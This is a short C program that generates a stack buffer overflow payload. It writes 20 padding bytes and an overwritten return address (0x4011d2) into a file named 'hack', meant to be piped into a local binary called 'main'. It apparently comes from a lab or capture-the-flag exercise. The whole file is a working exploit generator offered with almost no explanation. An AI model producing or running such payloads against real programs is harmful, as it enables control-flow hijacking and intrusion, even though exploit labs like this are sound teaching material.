/*
    Redirect the input stream to main when running "./main < hack"
*/

#include <stdio.h>

int main() {
    FILE* file;

    file = fopen("hack", "wb");

    char trash[] = "asdasdasdasdasdasdas";
    char addr[] = {0xd2, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00};

    for (unsigned int i = 0; i < 20; i++) {
        fwrite(&trash[i], sizeof(char), 1, file);
    }

    for (unsigned int i = 0; i < 8; i++) {
        fwrite(&addr[i], sizeof(char), 1, file);
    }

    fclose(file);
     

    return 0;
}
